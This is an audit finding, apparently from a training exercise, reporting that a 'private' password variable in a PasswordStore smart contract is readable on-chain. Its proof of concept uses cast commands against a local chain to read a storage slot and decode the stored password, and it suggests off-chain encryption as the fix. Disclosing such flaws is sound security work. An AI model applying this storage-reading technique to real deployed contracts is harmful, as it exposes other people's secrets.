### [H-2] The storage variable Password can be read directly from chain

**Description:** 
in the protocol, the password is stored in the variable `PasswordStore::s_password`,and this variable is private in the smart contract, but can be read directly on chain.

**Impact:** 
everyone will know the password


**Proof of Concept:**
1. Create a locally running chain
`make anvil`
2. Deploy the contract to the chain

`make deploy`

3. Run the storage tool

We use 1 because that's the storage slot of s_password in the contract.

`cast storage <ADDRESS_HERE> 1 --rpc-url http://127.0.0.1:8545`
You'll get an output that looks like this:

`0x6d7950617373776f726400000000000000000000000000000000000000000014`
You can then parse that hex to a string with:

`cast parse-bytes32-string 0x6d7950617373776f726400000000000000000000000000000000000000000014`
And get an output of:

`myPassword`

**Recommended Mitigation:** 
Due to this, the overall architecture of the contract should be rethought. One could encrypt the password off-chain, and then store the encrypted password on-chain. This would require the user to remember another password off-chain to decrypt the stored password. However, you're also likely want to remove the view function as you wouldn't want the user to accidentally send a transaction with this decryption key.
